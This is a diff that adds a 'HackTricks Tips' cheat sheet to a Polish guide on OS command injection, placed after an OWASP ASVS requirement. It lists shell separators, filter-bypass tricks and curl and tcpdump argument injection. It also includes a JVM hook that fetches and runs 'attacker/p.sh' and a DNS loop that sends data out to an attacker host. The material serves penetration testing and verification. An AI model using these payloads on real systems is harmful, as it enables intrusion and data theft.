@@ -159,3 +159,37 @@ Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas 
 | ID | Sekcja | Wymaganie |
 |---|---|---|
 | V1.2.5 | Injection Prevention | Verify that the application protects against OS command injection and that operating system calls use parameterized OS queries or use contextual command line output encoding. |
+
+
+---
+
+## HackTricks Tips
+
+### Separatory (Unix + Windows)
+
+`cmd1||cmd2`, `cmd1|cmd2`, `cmd1&&cmd2`, `cmd1&cmd2`, `cmd1%0Acmd2` (newline — polecany, omija większość filtrów), `` `cmd` ``, `$(cmd)`
+
+### Filter bypass
+
+- **IFS jako spacja**: `ls${IFS}id`, `cmd%0abash%09-c%09"id"%0a` (taby)
+- **Windows wildcards**: `powershell C:**2\n??e*d.*?` (notepad), `@^p^o^w^e^r^shell` (caret insertion)
+
+### Argument/Option Injection (bez metaznaków shell)
+
+Gdy `execve`/`execFile` ale args niesanityzowane:
+- `curl -o /tmp/x` → zapis do arbitrary path
+- `curl -K <url>` → load attacker-controlled config
+- `tcpdump -G 1 -W 1 -z /path/script.sh` → post-rotate execution
+
+### JVM Diagnostic RCE
+
+`-XX:OnOutOfMemoryError="/bin/sh -c 'curl attacker/p.sh|sh'"` — force OOM, execute hook
+
+### Blind data exfil
+
+- **Time-based**: `time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi`
+- **DNS**: `for i in $(ls /); do host "$i.attacker.burpcollaborator.net"; done`
+
+### Parametry do fuzzowania
+
+`?cmd=`, `?exec=`, `?ping=`, `?query=`, `?code=`, `?run=`, `?func=`, `?process=`
